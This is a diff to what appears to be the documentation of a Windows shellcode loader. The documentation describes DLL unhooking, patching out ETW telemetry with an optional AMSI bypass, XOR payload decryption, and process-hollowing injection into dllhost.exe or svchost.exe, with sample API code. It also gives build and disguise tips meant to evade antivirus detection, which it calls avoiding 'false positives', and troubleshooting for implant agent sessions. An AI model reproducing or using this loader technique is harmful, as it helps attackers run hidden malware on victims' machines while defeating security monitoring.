@@ -63,7 +63,7 @@ The loader runs in five stages:
 | 1 | **DLL unhooking** | Reads clean copies of system DLLs from disk, overwrites their `.text` sections in memory |
 | 2 | **Telemetry bypass** | Patches `EtwEventWrite` → `ret` (AMSI bypass available, commented out) |
 | 3 | **Decryption** | XOR-decrypts the payload in 4 KB chunks |
-| 4 | **Process creation** | Spawns `svchost.exe` suspended (or stays in-process) |
+| 4 | **Process creation** | Spawns `dllhost.exe` suspended (or stays in-process) |
 | 5 | **Injection** | `VirtualAllocEx` → `WriteProcessMemory` → `SetThreadContext` (`RIP`/`RAX`) → `ResumeThread` |
 
 ---
@@ -176,7 +176,7 @@ assert dec == open("shell.bin", "rb").read(), "key mismatch"
 | `-Os` | Optimise for size — changes the codegen fingerprint |
 | `-s` | Strip the symbol table |
 | `-static` | Embed the runtime, no DLL dependencies |
-| `-mwindows` | Hide the console window |
+| `-mwindows` | Hide the console window (don't add it if you want the monitring system to work)|
 
 Add version info and an icon to make the binary look less like a naked loader (this is really important for avoiding false positive detections):
 
@@ -214,7 +214,7 @@ unsigned char g_xor_key[] = {
 **Remote — process hollowing into `svchost.exe`** (default in the template)
 
 ```cpp
-CreateProcessW(NULL, L"C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
+CreateProcessW(NULL, L"C:\\Windows\\System32\\dllhost.exe", ..., CREATE_SUSPENDED, ...);
 VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 WriteProcessMemory(pi.hProcess, remote, shellcode, len, &written);
 GetThreadContext(pi.hThread, &ctx);
@@ -254,35 +254,12 @@ Prefer the in-process mode while debugging: it removes `CreateProcess`,
 
 ## Troubleshooting
 
-### `invalid conversion from 'FARPROC' to 'LPVOID'`
-
-mingw-w64 does not implicitly convert function pointers to `void*`. Cast explicitly:
-
-```cpp
-PVOID target = (PVOID)GetProcAddress(ntdll, "EtwEventWrite");
-```
-
-Apply the fix to the **template**, not only to the generated `.cpp` — otherwise it
-comes back at the next build.
-
-### `argument -k/--loader: expected at least one argument`
-
-A token starting with `-` is parsed as an option. Write `-k loader template.cpp`
-or just `-k template.cpp` — not `-k -loader template.cpp`.
-
-### The agent connects, then goes silent
-
-Most likely the host process died. `svchost.exe` launched standalone exits
-quickly, and if the shellcode returns instead of looping, the process
-disappears right after the first callback.
-
-
 ### Session shows "no response"
 
 Either the agent is dead, or it is alive but frozen. Confirm which:
 
 ```cmd
-tasklist /fi "imagename eq netmon.exe"
+tasklist /fi "imagename eq <whatEverYouWant.exe>"
 ```
 
 Absent → killed. Present but unresponsive → likely a sleep mask issue.
